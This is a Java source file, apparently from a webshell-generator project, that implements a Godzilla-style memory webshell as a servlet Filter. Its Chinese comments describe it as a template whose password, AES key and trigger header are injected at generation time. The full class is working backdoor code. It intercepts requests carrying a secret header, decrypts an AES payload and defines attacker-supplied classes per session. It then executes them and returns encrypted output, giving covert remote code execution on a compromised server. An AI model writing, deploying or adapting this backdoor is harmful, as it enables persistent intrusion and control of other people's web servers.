package com.reajason.javaweb.examples.customshelltool;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.PrintStream;
import java.io.PrintWriter;

/**
 * Filter 版模板：通信协议与内置的 GodzillaFilter 完全一致，唯一区别是 payload（core）的存放位置。
 *
 * <p>内置模板放在 <code>private static Class&lt;?&gt; payload</code>，全进程只认第一个会话注入的 core；
 * 这里改成放在当前 {@link HttpSession} 里（key 由生成期写入的随机 {@code sessionKey} 指定），
 * 于是每条连接（每个会话）都会把客户端带来的字节定义成自己的 core —— 换 core、换客户端互不影响，
 * 会话过期后 core 及其 ClassLoader 也随之释放。
 *
 * <p>字段值（pass/key/md5/headerName/headerValue/sessionKey）由
 * {@link GodzillaSessionGenerator} 在生成期通过 ByteBuddy 写入，本类只作为模板被读取字节码，
 * 不会在生成期被加载。
 *
 * @author ReaJason
 */
public class GodzillaSessionFilter extends ClassLoader implements Filter {
    private static String key;
    private static String pass;
    private static String md5;
    private static String headerName;
    private static String headerValue;
    private static String sessionKey;

    public GodzillaSessionFilter() {
    }

    public GodzillaSessionFilter(ClassLoader z) {
        super(z);
    }

    @Override
    @SuppressWarnings("all")
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain chain) throws ServletException, IOException {
        HttpServletRequest request = (HttpServletRequest) servletRequest;
        HttpServletResponse response = (HttpServletResponse) servletResponse;
        try {
            if (request.getHeader(headerName) != null && request.getHeader(headerName).contains(headerValue)) {
                PrintWriter writer = response.getWriter();
                try {
                    byte[] data = base64Decode(request.getParameter(pass));
                    data = this.x(data, false);
                    HttpSession session = request.getSession();
                    Class<?> payload = (Class<?>) session.getAttribute(sessionKey);
                    if (payload == null) {
                        // 本会话第一次请求：用本次请求携带的字节定义 core，并存进会话。
                        // 每次定义都新建一个 ClassLoader，同名 core 也不会撞 LinkageError。
                        session.setAttribute(sessionKey,
                                new GodzillaSessionFilter(Thread.currentThread().getContextClassLoader()).Q(data));
                    } else {
                        ByteArrayOutputStream arrOut = new ByteArrayOutputStream();
                        Object f = payload.newInstance();
                        f.equals(arrOut);
                        f.equals(request);
                        f.equals(data);
                        f.toString();
                        writer.write(md5.substring(0, 16));
                        writer.write(base64Encode(this.x(arrOut.toByteArray(), true)));
                        writer.write(md5.substring(16));
                        writer.flush();
                        writer.close();
                    }
                } catch (Throwable e) {
                    e.printStackTrace();
                    writer.write(getErrorMessage(e));
                }
                return;
            }
        } catch (Throwable e) {
            e.printStackTrace();
        }
        chain.doFilter(servletRequest, servletResponse);
    }

    @SuppressWarnings("all")
    public static String base64Encode(byte[] bs) throws Exception {
        String value = null;
        Class<?> base64;
        try {
            base64 = Class.forName("java.util.Base64");
            Object encoder = base64.getMethod("getEncoder", (Class<?>[]) null).invoke(base64, (Object[]) null);
            value = (String) encoder.getClass().getMethod("encodeToString", byte[].class).invoke(encoder, bs);
        } catch (Exception var6) {
            base64 = Class.forName("sun.misc.BASE64Encoder");
            Object encoder = base64.newInstance();
            value = (String) encoder.getClass().getMethod("encode", byte[].class).invoke(encoder, bs);
        }
        return value;
    }

    @SuppressWarnings("all")
    public static byte[] base64Decode(String bs) throws Exception {
        byte[] value = null;
        Class<?> base64;
        try {
            base64 = Class.forName("java.util.Base64");
            Object decoder = base64.getMethod("getDecoder", (Class<?>[]) null).invoke(base64, (Object[]) null);
            value = (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs);
        } catch (Exception var6) {
            base64 = Class.forName("sun.misc.BASE64Decoder");
            Object decoder = base64.newInstance();
            value = (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs);
        }
        return value;
    }

    @SuppressWarnings("all")
    public Class<?> Q(byte[] cb) {
        return super.defineClass(cb, 0, cb.length);
    }

    public byte[] x(byte[] s, boolean m) {
        try {
            Cipher c = Cipher.getInstance("AES");
            c.init(m ? 1 : 2, new SecretKeySpec(key.getBytes(), "AES"));
            return c.doFinal(s);
        } catch (Exception var4) {
            return null;
        }
    }

    @SuppressWarnings("all")
    private String getErrorMessage(Throwable throwable) {
        PrintStream printStream = null;
        try {
            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
            printStream = new PrintStream(outputStream);
            throwable.printStackTrace(printStream);
            return outputStream.toString();
        } finally {
            if (printStream != null) {
                printStream.close();
            }
        }
    }

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {
    }

    @Override
    public void destroy() {
    }
}
